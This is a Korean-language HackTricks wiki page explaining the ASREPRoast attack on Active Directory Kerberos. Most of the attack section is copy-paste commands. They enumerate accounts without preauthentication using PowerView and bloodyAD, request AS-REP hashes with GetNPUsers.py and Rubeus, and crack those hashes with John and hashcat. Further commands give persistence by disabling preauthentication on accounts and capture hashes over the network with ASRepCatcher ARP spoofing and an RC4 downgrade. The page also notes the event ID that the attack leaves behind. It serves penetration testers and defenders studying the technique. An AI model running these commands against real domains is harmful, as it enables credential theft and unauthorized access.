# ASREPRoast

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)로부터 AWS 해킹을 처음부터 전문가까지 배우세요!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **해킹 트릭을 공유하고 싶다면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

경험 많은 해커 및 버그 바운티 헌터와 소통하려면 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 서버에 가입하세요!

**해킹 통찰력**\
해킹의 스릴과 도전에 대해 탐구하는 콘텐츠와 상호 작용

**실시간 해킹 뉴스**\
빠르게 변화하는 해킹 세계의 최신 뉴스와 통찰력을 유지하세요

**최신 공지**\
출시되는 최신 버그 바운티 및 중요한 플랫폼 업데이트에 대해 알아두세요

**[**Discord**](https://discord.com/invite/N3FrSbmwdy)에 참여하여 최고의 해커들과 협업을 시작하세요!

## ASREPRoast

ASREPRoast는 **Kerberos 사전 인증이 필요한 속성**이 없는 사용자를 악용하는 보안 공격입니다. 본질적으로 이 취약점은 공격자가 사용자의 비밀번호를 필요로하지 않고 도메인 컨트롤러(DC)로부터 사용자의 인증을 요청할 수 있게 합니다. 그러면 DC는 사용자의 비밀번호로 생성된 키로 암호화된 메시지로 응답하며, 공격자는 이를 오프라인으로 해독하여 사용자의 비밀번호를 알아내려고 시도할 수 있습니다.

이 공격의 주요 요구 사항은 다음과 같습니다:

* **Kerberos 사전 인증 부재**: 대상 사용자는 이 보안 기능이 활성화되어 있지 않아야 합니다.
* **도메인 컨트롤러(DC)에 연결**: 공격자는 요청을 보내고 암호화된 메시지를 수신하기 위해 DC에 액세스해야 합니다.
* **선택 사항 도메인 계정**: 도메인 계정이 있으면 LDAP 쿼리를 통해 취약한 사용자를 더 효율적으로 식별할 수 있습니다. 이러한 계정이 없으면 공격자는 사용자 이름을 추측해야 합니다.

#### 취약한 사용자 열거(도메인 자격 증명 필요)

{% code title="Windows 사용" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Linux 사용하기" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
{% endcode %}

#### AS_REP 메시지 요청

{% code title="리눅스 사용" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Windows 사용하기" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
Rubeus를 사용한 AS-REP Roasting은 암호화 유형이 0x17이고 사전 인증 유형이 0인 4768을 생성합니다.
{% endhint %}

### 크래킹
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### 지속성

**GenericAll** 권한(또는 속성 쓰기 권한)이 있는 사용자에 대해 **preauth**가 필요하지 않도록 강제로 설정하십시오:

{% code title="Windows 사용 시" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="리눅스 사용하기" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## 자격 증명 없이 ASREProast

공격자는 중간자 위치를 이용하여 네트워크를 통해 AS-REP 패킷을 캡처할 수 있습니다. 이는 Kerberos 사전 인증이 비활성화되어 있지 않아도 작동합니다. 따라서 VLAN 상의 모든 사용자에게 적용됩니다.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)를 사용하여 이를 수행할 수 있습니다. 또한 해당 도구는 클라이언트 워크스테이션에 RC4를 사용하도록 강제하기 위해 Kerberos 협상을 변경합니다.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## 참고 자료

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 서버에 가입하여 경험 많은 해커 및 버그 바운티 헌터들과 소통하세요!

**해킹 통찰**\
해킹의 즐거움과 도전에 대해 탐구하는 콘텐츠와 상호 작용하세요

**실시간 해킹 뉴스**\
실시간 뉴스와 통찰을 통해 빠른 속도의 해킹 세계를 최신 상태로 유지하세요

**최신 공지**\
출시되는 최신 버그 바운티 및 중요한 플랫폼 업데이트에 대해 알아두세요

**[**Discord**](https://discord.com/invite/N3FrSbmwdy)에 참여하여 최고의 해커들과 협업을 시작하세요!

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**로부터 AWS 해킹을 제로부터 전문가까지 배우세요!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 PDF로 HackTricks를 다운로드하고 싶다면** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>
